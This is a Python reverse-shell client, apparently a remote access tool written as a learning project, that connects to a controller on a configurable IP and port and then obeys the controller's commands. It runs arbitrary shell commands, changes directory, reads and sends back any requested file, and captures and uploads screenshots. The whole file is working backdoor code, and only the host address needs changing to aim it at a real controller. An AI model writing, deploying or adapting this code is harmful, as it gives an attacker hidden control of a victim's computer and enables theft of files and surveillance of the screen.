import os
import platform
import socket
import time
import subprocess
from PIL import ImageGrab

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

s = socket.socket()
print(f"Connecting to {HOST_IP}, port {HOST_PORT}......")
while True:
    try:
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print(f"Impossible to connect to server. Reconnection.....")
        time.sleep(4)
    else:
        print("Connection established")
        break

while True:
    command_data = s.recv(MAX_DATA_SIZE)
    if not command_data:
        break
    command = command_data.decode()
    print(f"Command : {command}")
    command_split = command.split(' ')
    if command_split[0] == "info":
        respond = platform.platform() + " " + os.getcwd()
        respond = respond.encode()

    elif len(command_split) == 2 and command_split[0] == "cd" :
        try:
            os.chdir(command_split[1])
            # Did put a proper message to avoid noise in the server's console
            respond = " "
        except FileNotFoundError:
            respond = "Directory not found"
        respond = respond.encode()

    elif len(command_split) == 2 and command_split[0] == "dl":
        try:
            f = open(command_split[1], "rb")
            # respond is already encoded
            respond = f.read()
            f.close()
        except FileNotFoundError:
            # Did not put a message so that the server not take the error message as the downloaded file
            respond = " ".encode()

    elif len(command_split) == 2 and command_split[0] == "capture":
        filename = "screenshotTEST.png"
        screenshot = ImageGrab.grab()
        screenshot.save(filename, "PNG")
        try:
            f = open(filename, "rb")
            respond = f.read()
            f.close()
            subprocess.run(f"del /f {filename}",shell=True)
        except FileNotFoundError:
            respond = " ".encode()

    else:
        result = subprocess.run(command, shell=True, capture_output=True,universal_newlines=True)
        respond = result.stdout + result.stderr
        # Ensures the server does not block if respond is nothing
        if not respond or len(respond) == 0:
            respond = " "
        respond = respond.encode()

    data_len = len(respond)
    header = str(data_len).zfill(13)
    print(header)
    s.sendall(header.encode())
    if data_len > 0:
        s.sendall(respond)

s.close()

"""
I encoded respond in each of the conditions because we handle datatypes as close to the source as possible
"""